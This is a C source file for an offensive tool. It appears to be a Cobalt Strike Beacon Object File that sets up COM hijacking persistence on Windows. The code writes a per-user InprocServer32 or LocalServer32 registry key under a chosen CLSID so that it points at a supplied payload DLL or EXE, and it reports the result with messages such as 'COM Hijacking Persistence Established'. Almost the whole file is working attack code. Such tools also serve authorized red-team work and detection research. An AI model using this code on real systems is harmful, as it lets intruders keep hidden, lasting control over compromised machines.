#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

// Persist mode flags
#define COMHUNTER_PERSIST_INPROCSERVER  0  // -i, --inprocserver32
#define COMHUNTER_PERSIST_LOCALSERVER   1  // -l, --localserver32

void BuildRegistryKey(const char* clsid, char* inprocPath, char* localPath, DWORD pathSize)
{
    MSVCRT$_snprintf(inprocPath, pathSize, "SOFTWARE\\Classes\\CLSID\\%s\\InprocServer32", clsid);
    MSVCRT$_snprintf(localPath, pathSize, "SOFTWARE\\Classes\\CLSID\\%s\\LocalServer32", clsid);
}

// Get file extension from path 
const char* GetFileExtension(const char* filePath)
{
    const char* dot = NULL;
    const char* slash = NULL;
    const char* p = filePath;

    // Find last occurrence of dot and slash
    while (*p)
    {
        if (*p == '.')
            dot = p;
        else if (*p == '\\' || *p == '/')
            slash = p;
        p++;
    }

    // If dot is after the last slash (or no slash), return the extension
    if (dot != NULL && (slash == NULL || dot > slash))
    {
        return dot;
    }

    return NULL;
}

// Case-insensitive string comparison
int ComHunterStrCmpI(const char* s1, const char* s2)
{
    while (*s1 && *s2)
    {
        char c1 = *s1;
        char c2 = *s2;
        
        // Convert to lowercase
        if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
        if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
        
        if (c1 != c2)
            return c1 - c2;
        
        s1++;
        s2++;
    }
    return *s1 - *s2;
}

// Check if file extension matches the expected extension for server type
// Returns ERROR_SUCCESS if valid, ERROR_INVALID_PARAMETER if invalid
DWORD CheckExtension(const char* filePath, const char* serverType)
{
    const char* extension = GetFileExtension(filePath);

    if (extension == NULL)
    {
        internal_printf("[!] No file extension found in path: %s\n", filePath);
        return ERROR_INVALID_PARAMETER;
    }

    if (MSVCRT$strcmp(serverType, "InprocServer32") == 0)
    {
        if (ComHunterStrCmpI(extension, ".dll") != 0)
        {
            internal_printf("[!] Wrong file extension for InprocServer32. Expected .dll, got %s\n\n", extension);
            return ERROR_INVALID_PARAMETER;
        }
    }
    else if (MSVCRT$strcmp(serverType, "LocalServer32") == 0)
    {
        if (ComHunterStrCmpI(extension, ".exe") != 0)
        {
            internal_printf("[!] Wrong file extension for LocalServer32. Expected .exe, got %s\n\n", extension);
            return ERROR_INVALID_PARAMETER;
        }
    }
    else
    {
        internal_printf("[!] Invalid server type: %s\n\n", serverType);
        return ERROR_INVALID_PARAMETER;
    }

    return ERROR_SUCCESS;
}

DWORD CreateRegistryCU(const char* registryKey, const char* payload, const char* serverType)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD dwDisposition = 0;
    const char* threadingModel = "Both";

    dwErrorCode = ADVAPI32$RegCreateKeyExA(
        HKEY_CURRENT_USER,
        registryKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE | KEY_WOW64_64KEY,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (dwErrorCode != ERROR_SUCCESS)
    {
        internal_printf("[!] Error creating registry key: %lX\n", dwErrorCode);
        goto CreateRegistryCU_end;
    }

    // Set default value to payload path
    dwErrorCode = ADVAPI32$RegSetValueExA(
        hKey,
        NULL,  // Default value
        0,
        REG_SZ,
        (const BYTE*)payload,
        MSVCRT$strlen(payload) + 1
    );

    if (dwErrorCode != ERROR_SUCCESS)
    {
        internal_printf("[!] Error setting default value: %lX\n", dwErrorCode);
        goto CreateRegistryCU_end;
    }

    // Set ThreadingModel to "Both" (only for InprocServer32)
    if (MSVCRT$strstr(registryKey, "InprocServer32") != NULL)
    {
        dwErrorCode = ADVAPI32$RegSetValueExA(
            hKey,
            "ThreadingModel",
            0,
            REG_SZ,
            (const BYTE*)threadingModel,
            MSVCRT$strlen(threadingModel) + 1
        );

        if (dwErrorCode != ERROR_SUCCESS)
        {
            internal_printf("[!] Error setting ThreadingModel: %lX\n", dwErrorCode);
            goto CreateRegistryCU_end;
        }
    }

    internal_printf("[+] %s COM Hijacking Persistence Established!\n", serverType);
    internal_printf("[+] Registry Key Path: Computer\\HKCU\\%s\n", registryKey);
    internal_printf("[+] Registry Key Value: %s\n", payload);
    if (MSVCRT$strstr(registryKey, "InprocServer32") != NULL)
    {
        internal_printf("[+] ThreadingModel: %s\n", threadingModel);
    }

CreateRegistryCU_end:
    if (hKey != NULL)
    {
        ADVAPI32$RegCloseKey(hKey);
    }

    return dwErrorCode;
}

DWORD ComHunterPersist(const char* clsid, const char* payload, int persistMode)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    char inprocPath[512] = {0};
    char localPath[512] = {0};
    const char* serverType = NULL;
    const char* registryKey = NULL;

    BuildRegistryKey(clsid, inprocPath, localPath, sizeof(inprocPath));

    internal_printf("[*] Starting Classic Persist Mode...\n");
    internal_printf("[*] CLSID: %s\n", clsid);
    internal_printf("[*] Payload: %s\n\n", payload);

    switch (persistMode)
    {
        case COMHUNTER_PERSIST_INPROCSERVER:
            serverType = "InprocServer32";
            registryKey = inprocPath;
            break;

        case COMHUNTER_PERSIST_LOCALSERVER:
            serverType = "LocalServer32";
            registryKey = localPath;
            break;

        default:
            internal_printf("[!] Invalid persist mode: %d\n", persistMode);
            internal_printf("[*] Valid modes:\n");
            internal_printf("    0 = InprocServer32\n");
            internal_printf("    1 = LocalServer32\n");
            dwErrorCode = ERROR_INVALID_PARAMETER;
            goto ComHunterPersist_end;
    }

    // Check file extension before creating registry key
    dwErrorCode = CheckExtension(payload, serverType);
    if (dwErrorCode != ERROR_SUCCESS)
    {
        goto ComHunterPersist_end;
    }

    dwErrorCode = CreateRegistryCU(registryKey, payload, serverType);

ComHunterPersist_end:
    return dwErrorCode;
}

#ifdef BOF
VOID go( 
    IN PCHAR Buffer, 
    IN ULONG Length 
) 
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    datap parser = {0};
    const char* clsid = NULL;
    const char* payload = NULL;
    int persistMode = 0;

    BeaconDataParse(&parser, Buffer, Length);
    clsid = BeaconDataExtract(&parser, NULL);
    payload = BeaconDataExtract(&parser, NULL);
    persistMode = BeaconDataInt(&parser);

    if(!bofstart())
    {
        return;
    }

    dwErrorCode = ComHunterPersist(clsid, payload, persistMode);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ComHunterPersist failed: %lX\n", dwErrorCode);
        goto go_end;
    }

    internal_printf("\nSUCCESS.\n");

go_end:
    printoutput(TRUE);
    bofstop();
};
#else
int main(int argc, char** argv)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    const char* clsid = "{00000000-0000-0000-0000-000000000000}";
    const char* payload = "C:\\Windows\\Temp\\payload.dll";
    int persistMode = COMHUNTER_PERSIST_INPROCSERVER;

    if (argc >= 4)
    {
        clsid = argv[1];
        payload = argv[2];
        persistMode = atoi(argv[3]);
    }

    dwErrorCode = ComHunterPersist(clsid, payload, persistMode);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ComHunterPersist failed: %lX\n", dwErrorCode);
        goto main_end;
    }

    internal_printf("\nSUCCESS.\n");

main_end:
    return dwErrorCode;
}
#endif
